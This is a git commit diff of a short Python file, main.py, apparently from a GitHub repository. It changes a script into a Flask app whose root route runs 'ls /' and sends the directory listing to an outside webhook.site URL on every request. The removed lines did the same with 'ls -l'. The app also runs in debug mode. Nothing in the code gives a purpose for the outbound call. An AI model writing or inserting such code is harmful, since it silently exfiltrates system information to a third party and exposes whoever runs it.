bc7a91016929689ec007b4c9fd99258c6305608e
Ranush Mithila <36297308+RanushMithila@users.noreply.github.com>
2024-06-06 15:48:25 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,17 @@
 import subprocess
 import requests
-result = subprocess.run(["ls", "-l"], capture_output=True, text=True)
-print(result.stdout)
 
-url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?"+result.stdout
-res = requests.get(url)
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route('/')
+def hello():
+    result = subprocess.run(["ls", "/"], capture_output=True, text=True)
+    print(result.stdout)
+    url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?"+result.stdout
+    res = requests.get(url)
+    return result.stdout
+
+if __name__ == "__main__":
+    app.run(debug=True)
